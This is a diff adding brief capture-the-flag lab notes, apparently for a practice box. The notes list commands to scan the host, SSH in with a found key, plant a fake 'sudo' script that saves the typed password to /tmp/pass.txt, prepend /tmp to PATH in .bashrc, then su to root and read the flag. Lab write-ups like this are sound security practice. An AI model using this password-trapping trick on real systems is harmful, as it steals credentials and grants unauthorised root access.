@@ -1,0 +1,18 @@
+1 - nmap -A 10.10.194.208
+2 - chmod 600 idrsa.id-rsa
+3 - ssh -i idrsa.id-rsa frank@10.10.194.208
+4 - nano /tmp/sudo
+#!/bin/bash
+
+read pass
+echo $pass > /tmp/pass.txt
+
+5 - chmod +x /tmp/sudo
+6 - nano /home/frank/.bashrc
+export PATH=/tmp:$PATH
+
+7 - ssh -i idrsa.id-rsa frank@10.10.194.208
+8 - cat /tmp/pass.txt
+9 - su root
+10 - cat /root/flag.txt
+
